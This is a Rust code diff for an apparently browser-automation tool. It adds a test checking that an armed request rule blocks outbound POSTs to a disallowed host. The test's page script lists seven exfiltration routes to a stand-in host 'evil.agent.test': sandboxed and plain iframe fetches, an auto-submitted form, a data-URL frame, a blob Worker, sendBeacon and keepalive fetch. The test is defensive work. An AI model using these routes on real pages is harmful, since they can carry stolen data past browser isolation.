@@ -79,11 +79,14 @@ pub enum Outcome {
     Refused,
 }
 
+/// A request that the rule paused before it left: its method, origin and path, the id of the
+/// frame that made it, whether the rule let it through, and how the browser took the answer.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct PausedRequest {
     pub method: String,
     pub origin: String,
     pub path: String,
+    pub frame: String,
     pub let_through: bool,
     pub outcome: Outcome,
     pub body: Vec<u8>,
@@ -1364,5 +1367,89 @@ mod tests {
             line.render(),
             "e7 textbox \"Say ''hi''\" credential frame=http://pay.agent.test:18090"
         );
+    }
+
+    const WAYS_OUT: &str = r#"(() => {
+  const E = 'http://evil.agent.test:PORT';
+  const F = (p) => "fetch('" + E + p + "', {method: 'POST', body: 'x', mode: 'no-cors'})";
+  const frame = (a) => { const i = document.createElement('iframe'); for (const k in a) i.setAttribute(k, a[k]); document.body.appendChild(i); };
+  frame({sandbox: 'allow-scripts', srcdoc: '<script>' + F('/sbfetch') + '<\/script>'});
+  frame({srcdoc: '<script>' + F('/plainfetch') + '<\/script>'});
+  frame({sandbox: 'allow-scripts allow-forms', srcdoc: '<form method=post action="' + E + '/sbform"></form><script>document.forms[0].submit()<\/script>'});
+  frame({src: 'data:text/html,<script>' + encodeURIComponent(F('/datafetch')) + '<\/script>'});
+  new Worker(URL.createObjectURL(new Blob([F('/worker')])));
+  navigator.sendBeacon(E + '/beacon', 'x');
+  fetch(E + '/keepalive', {method: 'POST', body: 'x', mode: 'no-cors', keepalive: true}).catch(() => {});
+  return true;
+})()"#;
+
+    #[tokio::test]
+    #[ignore = "starts the browser that R3_TEST_BROWSER names and the fixture server; run with --ignored"]
+    async fn the_armed_rule_fails_every_post_to_a_host_that_is_not_allowed() {
+        let browser = std::env::var("R3_TEST_BROWSER")
+            .expect("R3_TEST_BROWSER names the browser binary for the ignored tests");
+        let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../..");
+        let server = crate::fixture::Server::start(
+            &crate::fixture::fixture_program(&repo),
+            &["--port".into(), "0".into()],
+        )
+        .expect("fixture");
+        let port = server.port;
+        let control = crate::fixture::Control { port };
+        control.reset(&[]).expect("reset");
+        let base = Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join("target")
+            .join("test-tmp");
+        std::fs::create_dir_all(&base).expect("test-tmp");
+        let mut flags: Vec<String> = crate::FIRST_FLAGS.iter().map(|f| f.to_string()).collect();
+        flags.push(crate::RESOLVER_RULE.to_string());
+        flags.push(crate::isolate_flag(port));
+        let opts = StartOptions {
+            browser: PathBuf::from(browser),
+            profile: base.join(format!("rule-{}-{port}", std::process::id())),
+            headless: true,
+            flags,
+            debug_port: None,
+        };
+        let mut ex = Executor::start(&opts).await.expect("start");
+        let utility = crate::fixture::origin(crate::fixture::UTILITY, port);
+        let steps = async {
+            ex.open(&format!("{utility}/signin")).await?;
+            ex.arm_rule(vec![utility.clone()], false).await?;
+            ex.run_page_script(&WAYS_OUT.replace("PORT", &port.to_string()))
+                .await?;
+            tokio::time::sleep(Duration::from_secs(4)).await;
+            Ok::<(Vec<PausedRequest>, Vec<String>), Fault>((ex.paused(), ex.attach_faults()))
+        }
+        .await;
+        let state = control.state();
+        ex.stop_and_remove().await;
+        server.stop();
+        let (paused, faults) = steps.expect("steps");
+        let evil = crate::fixture::count(&state.expect("state"), &["requests", "evil"]);
+        let failed: Vec<String> = paused
+            .iter()
+            .filter(|p| host_of(&p.origin) == "evil.agent.test" && p.outcome == Outcome::Failed)
+            .map(|p| p.path.clone())
+            .collect();
+        assert_eq!(
+            evil,
+            Some(0),
+            "requests.evil moved; failed: {failed:?}; faults: {faults:?}"
+        );
+        for path in [
+            "/sbfetch",
+            "/plainfetch",
+            "/sbform",
+            "/datafetch",
+            "/worker",
+            "/beacon",
+            "/keepalive",
+        ] {
+            assert!(
+                failed.iter().any(|f| f == path),
+                "{path} was not failed: {failed:?}; faults: {faults:?}"
+            );
+        }
     }
 }
